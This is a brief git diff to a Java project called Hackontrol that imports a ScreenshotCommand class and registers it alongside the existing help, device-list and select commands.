@@ -10,6 +10,7 @@ import java.util.Random;
 import com.khopan.hackontrol.command.Command;
 import com.khopan.hackontrol.command.DeviceListCommand;
 import com.khopan.hackontrol.command.HelpCommand;
+import com.khopan.hackontrol.command.ScreenshotCommand;
 import com.khopan.hackontrol.command.SelectCommand;
 import com.khopan.hackontrol.source.CommandSource;
 import com.khopan.hackontrol.source.DefaultCommandSource;
@@ -40,6 +41,7 @@ public class Hackontrol {
 		this.registerCommand(new HelpCommand());
 		this.registerCommand(new DeviceListCommand());
 		this.registerCommand(new SelectCommand());
+		this.registerCommand(new ScreenshotCommand());
 	}
 
 	private void registerCommand(Command command) {
